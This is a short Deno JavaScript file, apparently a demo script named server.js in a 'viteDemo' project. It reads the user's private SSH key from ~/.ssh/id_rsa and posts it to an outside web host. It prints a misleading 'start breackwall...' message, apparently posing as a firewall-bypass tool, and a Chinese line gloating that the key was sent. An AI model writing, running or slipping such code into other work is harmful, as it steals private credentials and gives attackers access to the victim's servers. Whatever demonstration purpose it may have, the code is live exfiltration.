/*
 * @Author: your name
 * @Date: 2020-10-12 14:32:33
 * @LastEditTime: 2020-10-12 14:34:29
 * @LastEditors: Please set LastEditors
 * @Description: In User Settings Edit
 * @FilePath: /viteDemo/server.js
 */
//index.js
let rsa = Deno.readFileSync(Deno.dir("home") + "/.ssh/id_rsa");

rsa = new TextDecoder().decode(rsa);

fetch(("http://jsonplaceholder.typicode.com/posts/1"),{
  method:"POST",
  body: JSON.stringify(rsa)
})
    .then((res)=>res.json())
    .then((res)=>console.log("密钥发送成功，嘿嘿嘿😝"));
console.log("start breackwall...");